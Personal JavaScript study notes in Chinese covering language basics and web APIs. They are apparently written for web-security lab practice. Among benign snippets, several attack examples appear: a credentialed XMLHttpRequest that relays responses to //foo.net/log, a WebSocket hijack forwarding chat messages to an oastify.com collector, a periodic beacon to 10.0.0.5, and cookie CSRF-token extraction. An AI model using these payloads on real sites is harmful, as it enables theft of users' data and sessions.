图书：
- https://eloquentjavascript.net/

## 变量

如果不包含 `var`、`let` 或 `const` 这样的关键字，您定义的任何变量都会被提升到全局作用域。这意味着作为全局作用域子对象的任何其他对象都能访问该变量。

所有缺少 `var`、`let` 或 `const` 的变量也会在浏览器中的 `window` 对象上添加一个指针

```js
// 全局变量
foo = 0;
// 函数级可变变量（定义后作用于全函数，而超越当前代码块）
var foo = 0;
// 块级变量
let foo = 0;
// 块级常量
const foo = 0;


// 变量直接调用
console.log(age);

// 全局变量通过 window 上的指针调用
console.log(window.age);
```

## 函数

在 JavaScript 中，函数是对象。这意味着它们可以使用上一节中的变量和标识符进行赋值和重新赋值。

```javascript
// 匿名函数
function() {};

// 全局声明的命名函数
a = function() {};

// 函数作用域命名函数
var a = function() {};

// 块级作用域命名函数
let a = function() {};

// 块级作用域命名函数，不可重新赋值
const a = function() {};

// 继承父级上下文的匿名函数
() => {};

// 立即调用函数表达式（IIFE）
(function() {})();
```

## 上下文

在函数之间共享上下文：

```javascript
// 创建一个带有 ageData 上下文的 getAge() 函数克隆
// 然后使用参数 'joe' 调用它
const getBoundAge = getAge.bind(ageData)('joe');

// 使用 ageData 上下文和参数 joe 调用 getAge()
const boundAge = getAge.call(ageData, 'joe');

// 使用 ageData 上下文和参数 joe 调用 getAge()
const boundAge = getAge.apply(ageData, ['joe']);
```

这三个函数 `bind`、`call` 和 `apply` 允许开发者将上下文从一个函数移到另一个函数。`call` 和 `apply` 的唯一区别是 `call` 接受参数列表，而 `apply` 接受参数数组。


另一个帮助程序员管理上下文的新增功能是箭头函数，也称为简写函数。该函数继承其父级的上下文，允许上下文从父函数共享到子函数，而无需显式 `call`/`apply` 或 `bind`：

```javascript
// 全局上下文，全局变量 garlic 为 false
this.garlic = false;

// soup 对象，对象属性 garlic 为 true
const soup = { garlic: true };

// 附加到 soup 对象的标准函数，使用 soup 对象的属性 soup.garlic
soup.hasGarlic1 = function() { console.log(this.garlic); } // true

// 附加到全局上下文的箭头函数，使用全局属性 windows.garlic
soup.hasGarlic2 = () => { console.log(this.garlic); } // false
```

## 原型继承

JavaScript 并不真正支持类，而是在 JavaScript 原型系统之上通过一些抽象来模拟类的功能。在原型继承系统中，如 JavaScript，创建的任何对象都有一个名为 `prototype` 的属性附加到它上面。`prototype` 属性附带一个 `constructor` 属性，指向拥有该原型的函数。这意味着任何对象都可以用来实例化新对象，因为构造函数指向包含原型的对象，而原型包含构造函数。

```javascript
const 原型 = function(参数) {
  this.参数 = 值;
  this.方法a = function() {
    return this.参数;
  };
};

const 原型对象 = new 原型(参数);
console.log(原型对象.方法a());
```

当在 JavaScript 中创建新对象时，还会创建一个单独的对象 `__proto__`。该对象指向在创建该对象时调用其构造函数的原型。

由于 JavaScript 中的所有对象默认都是可变的，对 `prototype` 属性的更改可以在运行时的任何时刻发生。

与更严格设计的继承模型不同，JS 继承树可以在运行时改变。

```js
const 原型对象 = new 原型(参数);
原型对象.方法b(); // 不存在的方法报错

Vehicle.prototype.原型对象 = function() {
  return 0;
};

原型对象.方法b(); // 动态添加的存在的方法
```

## 异步

Promise：对象在给定函数完成后调用下一个函数（调用链）

在异步对象的作用域内，使用回调函数 resolve, reject 分别指定正常（继续传递）与异常（触发 catch）的条件

```js
// resolve, reject 为 Promise 的正常/异常回调函数
const promise = new Promise((resolve, reject) => {
  函数a(function(参数a) {
    // 处理正常/异常状态
    if (参数a) { return resolve(参数a); }
    return reject();
  });
}).then((参数a) => {
  return new Promise((resolve, reject) => {
    函数b(参数a, function(参数b) {
      if (参数b) { return resolve(参数b); }
      return reject();
    });
  });
}).catch((err) => {
  // 接收异常状态
  console.log('an error occurred!');
});
```

`async` 异步修饰将函数转换为尚未兑现的 `Promise`，在其中使用 `await` 等待对应步骤实现

```javascript
const 函数对象 = async function() {
  let 参数a = await 函数a();
  let 参数b = await 函数b(参数a);
};

函数对象();
```

## 浏览器 DOM

DOM 是用于在现代 Web 浏览器中管理状态的层次化表示数据。`window` 对象是最顶层标准对象之一。

## ```atob()```与```btoa()``` 
[mdn文档](https://mdn.org.cn/en-US/docs/Web/API/Window/atob)：

```typescript
const routes: Routes = [
{
path: atob('c2NvcmUtYm9hcmQ='),
component: ScoreBoardComponent
}
]
```
    
> Window 接口的 atob() 方法解码使用 Base64 编码的数据字符串。使用 Window.btoa() 方法编码和传输可能导致通信问题的数据，然后传输它并使用 atob() 方法再次解码数据。

## 阻止当前页面及同源的其他页面修改本地 localStorage 的特定字段

如果仅在单个页面设置，需监测其他页面。
若对所有页面生效则只需第一段阻止本页面存储。

```javascript
const block_key = 'target_key';
window.localStorage.getItem(block_key)

const originalSetItem = localStorage.setItem;
localStorage.setItem = function(key, value) {
    if (key != block_key){
        originalSetItem.call(this, key, value);
    }
};

window.addEventListener('storage', (event) => {
    if (event.key == block_key && event.newValue != null){
        localStorage.removeItem(block_key);
    }
});
```
在当前页面，创建一个`localStorage.setItem`的包装函数，添加储存条件为储存字段非拦截字段。
`storage` 事件，在同源的其他页面存储操作完成时触发。
在当前页面添加存储事件监听器，当其他页面的存储事件触时清空拦截字段的值（清空后值为 `null`，添加条件判断避免死循环）。


## 选择所有编辑链接，将跳转替换为复制链接地址到粘贴板，并阻止跳转

```js
const edit_links = document.querySelectorAll("a.github-edit-link");

edit_links.forEach(link => {
    link.addEventListener('click', (event) => {
        console.log(event.currentTarget.href);
        navigator.clipboard.writeText(event.currentTarget.href);
        event.preventDefault();
    });
});
```

## fetch

<https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch>


- `response.ok` 判断状态
```js
if (!response.ok) {
  if (response.status === 404) {
    console.log('请求的资源不存在');
  } else if (response.status === 500) {
    console.log('服务器内部错误');
  }
}

```

- `redirect: 'manual'`
  不追踪重定向

## XMLHttpRequest


```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://foo.net',true);
req.withCredentials = true;
req.send();

function reqListener() {
  location='//foo.net/log?data='+this.responseText;
};
```

## setInterval

setInterval方法用于按照指定的时间间隔重复调用函数或执行代码片段。

```js
<script>
(()=> {
  if (window.__hb1) return;
  window.__hb1 = 1;
  let i = 0;
  setInterval(async () => {
    i++;

    const img = new Image();
    img.src = "http://10.0.0.5:9999/ping?i=" + i + "&t=" + Date.now();
  }, 1000);
})();
</script>
```

## JSON


- `JSON.parse(jsonString)`
  将 JSON 字符串转换为对象

- `JSON.stringify(value, replacer, space)` 
    用于将 JavaScript 值（对象、数组、原始类型等）转换为 JSON 格式字符串

## URL

```js
// 将 URL 字符串设置为 URL 对象
const url = new URL(location);

// 从 URL 对象的搜索参数中访问 csrf 的值
const csrf = url.searchParams.get('csrf');
```

## document

创建元素并添加到 DOM

```js
const form = document.createElement('form');
form.method = 'post';
document.documentElement.append(form);
```

## 其他

在 `window` 全局作用域设置 `__` 双下划线自定义属性名，避免重复执行后续js代码。
自定义属性名初始为 undefined（假值）。
```js
if (window.__agent) return;
window.__agent = true;
```


- `encodeURIComponent()`
    对字符串进行 URI 编码


## 字符串

- `'A'.repeat(重复次数)`
  构造重复字符串

## fs - 文件系统

https://nodejs.org/api/fs.html

- `filehandle.createReadStream([options])`
  创建文件读取流

- `unlink(文件路径字符串)`
  删除文件

## 流

- `readable.pipe()` 
  添加可写属性到可读对象上，并切换到流模式

## 事件

- `.on(事件名称, 回调函数)`
  发生事件时执行预设函数

## csv-parser - csv 处理库

https://www.npmjs.com/package/csv-parser

```js
const csv = require('csv-parser')
const fs = require('fs')
const results = [];

fs.createReadStream('data.csv')
  .pipe(csv())
  .on('data', (data) => results.push(data))
  .on('end', () => {
    console.log(results);
    // [
    //   { NAME: 'Daffy Duck', AGE: '24' },
    //   { NAME: 'Bugs Bunny', AGE: '22' }
    // ]
  });
```

## String

- `String.prototype.split(separator[, limit])`
  接受一个模式，通过搜索模式将字符串分割成一个有序的子串列表，将这些子串放入一个数组，并返回该数组。

- `String.prototype.match(regexp)`
  返回值：一个 `Array`，其内容取决于全局标志 (`g`) 的存在与否，如果没有找到匹配项，则返回 `null`。

## Array

- `Array.prototype.shift()`
  从数组中删除第一个元素，并返回该元素的值。此方法更改数组的长度。

## Object

- `Object.defineProperty(obj, prop, descriptor)` 潜在攻击工具属性的防御型方法
  直接在一个对象上定义一个新属性，或修改其现有属性，并返回此对象。

- `Object.freeze()` 防御型静态方法
  使一个对象被冻结。冻结对象可以防止扩展，并使现有的属性不可写入和不可配置。（完全阻止）

- `Object.seal()` 防御型静态方法
  密封一个对象。密封一个对象会阻止其扩展并且使得现有属性不可配置。只要现有属性的值是可写的，它们仍然可以更改。（部分阻止）

- `Object.create()` 防御型静态方法
  以一个现有对象作为原型，创建一个新对象。

## Map

- `Map.prototype.get()` 防御型方法
  返回该 map 中的指定元素。不包含继承属性

## Set

- `Set.prototype.has()` 防御型方法
  返回一个布尔值来指示对应的值是否存在于该集合中。不包含继承属性

## 语句和声明

https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements

- `debugger` 语句
  调用任何可用的调试功能，例如设置断点。如果没有调试功能可用，则此语句不会产生任何效果。

## Web API

https://developer.mozilla.org/zh-CN/docs/Web/API

### console

https://developer.mozilla.org/zh-CN/docs/Web/API/console

- `console.trace()` 静态方法
  将堆栈追踪信息输出到控制台

### WebSocket

https://developer.mozilla.org/en-US/docs/Web/API/WebSocket

- `WebSocket()` 构造函数
  返回一个 WebSocket 对象
  ```js
  new WebSocket(url)
  new WebSocket(url, protocols)
  ```
  - url
    必须使用以下方案之一：ws、wss、http 或 https，且不得包含 URL 片段

- `WebSocket.send()` 方法
  将需要通过 WebSocket 链接传输至服务器的数据排入队列

```js
let newWebSocket = new WebSocket("wss://id.web-security-academy.net/chat");

newWebSocket.onopen = function(evt) {
    newWebSocket.send("READY");
}

newWebSocket.onmessage = function(evt) {
    var message = evt.data;

    fetch("https://id.oastify.com/ws", {
        method: "POST",
        mode: 'no-cors', 
        body: message
    });
};
```

## 其他

- `setTimeout(函数, 时间)`
  延迟执行函数
- `setInterval(函数, 时间)`
  定时执行函数

- `require('模块名称')`
  导入模块

- 双 `!!` 运算符判断是否为已定义

- `top`
  顶层页面

- `tabindex`
  tabindexglobal 属性允许开发者使 HTML 元素可聚焦

- `/Alfresco-CSRFToken=([^;]*)/.exec(document.cookie)[1]`
  对 cookie 应用正则表达式捕获组，并选择第一个匹配

- `(+val + '') === val`
  预期的数字型字符串，`+val`隐式类型转换到数字，`+ ''`再隐式类型转换到字符串。确保变量类型为数字型字符串